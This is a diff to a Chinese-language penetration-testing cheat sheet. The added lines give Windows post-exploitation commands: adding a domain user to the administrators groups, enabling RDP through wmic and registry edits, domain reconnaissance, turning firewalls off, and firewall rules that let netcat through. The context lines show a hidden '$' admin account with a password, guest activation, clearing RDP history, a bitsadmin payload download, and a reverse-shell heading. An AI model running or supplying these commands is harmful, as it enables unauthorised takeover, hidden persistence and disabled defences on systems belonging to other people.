@@ -204,6 +204,10 @@ useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 net user s6adm$ Afabab@20 /add
 net localgroup administrators s6adm$ /add
 net user guest /active:yes
+
+Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组
+
+Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组
 ```
 
 ## 防火墙
@@ -271,6 +275,17 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
 cd %userprofile%\documents\attrib Default.rdp -s -h
 del Default.rdp
 ```
+
+
+## 开3389
+```
+系统windows server 2003后
+wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+net start TermService
+```
+
 ## 文件查找
 
 ```
@@ -382,6 +397,99 @@ bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
 ```
 
 
+## windows信息收集常用命令
+```
+Systeminfo 计算机详细信息(补丁信息)
+
+Net start 所启动的服务
+
+Wmic service list brief 查询本机服务信息
+
+Tasklist 进程列表
+
+Wmic startup get command,caption 查看启动该程序信息
+
+Schtasks /query /fo LIST /v计划任务
+
+Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色
+
+Query user || qwinsta 查看当前在线用户
+
+Net session 列出会话
+
+Net share 查看本机的共享列表
+
+Wmic share get name,path,status 查看共享列表
+
+Net user 本地用户
+
+Net user kkkk 查看本地用户信息
+
+
+Net localgroup 本地用户组
+
+Net localgroup /domain 域用户组
+
+Net localgroup adminnstrators 本地管理员组成员
+
+net localgroup adminstrators /domain 域管理员组成员
+
+Wmic useraccount get /all 获取域内用户详细信息
+
+dsquery user 查看存在的用户
+
+Net user /domain 域用户信息
+
+Net user kkkk /domain 域用户kkkk信息
+
+Net user kent password /add /domain添加域用户
+
+
+Net group /domain 域用户组信息
+
+Net view /domain 查询域
+
+Net view /domain:test 查询域内计算机
+
+Net accounts /domain 查询域中密码策略
+
+Net group /domain 查看域内所有用户组
+
+Net group “Domain Controllers” /domain 查看域控制器组
+
+Net group “Domain computers” /domain 查看域内所有计算机列表
+
+Net group “Domain admins” /domain 查看域内管理员用户
+
+Net user /domain kent active:yes 启用域账户
+
+Net user /domain kent active:no 禁用域账户
+
+Nltest /DCLIST:test 查看域中域控制器名
+
+Wmic useraccount get /all 用户详细信息
+
+Net group “Domain Admins” /domain 对应组下的账户信息
+
+nltest /domain_trusts 获取域信任信息
+
+net config workstation 了解本机的配置信息
+
+Netsh firewall show config 查看防火墙配置
+
+Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)
+
+Netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”C:\nc.exe” 允许指定程序进入(windows server 2003后)
+
+Netsh advfirewall firewall add rule name=”allow nc” dir=out action=allow program=”C:\nc.exe”允许指定程序退出(windows server 2003后)
+
+Netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)
+
+Reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”查看端口代理配置信息
+
+Reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber 查看远程桌面端口号
+
+```
 
 ## 反弹shell
 
